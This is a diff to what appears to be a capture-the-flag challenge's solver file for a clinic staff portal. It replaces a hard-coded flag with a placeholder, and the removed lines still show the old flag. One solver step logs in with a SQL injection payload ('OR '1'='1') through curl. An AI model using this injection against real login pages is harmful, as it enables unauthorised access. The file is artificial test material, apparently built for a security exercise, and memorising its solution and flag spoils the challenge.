@@ -41,10 +41,10 @@ solver:
     command: curl -s -c /tmp/clinic_jar -b /tmp/clinic_jar -L -d "username=admin&password=anything' OR '1'='1" http://{target.clinic-portal}/staff/login | grep -o 'Token 3 = 0wn3d'
     expect: Token 3 = 0wn3d
   - name: Verify assembled flag
-    command: echo 'OCR{p1n3cr3st_l34k_0wn3d}'
-    expect: OCR{p1n3cr3st_l34k_0wn3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{p1n3cr3st_l34k_0wn3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
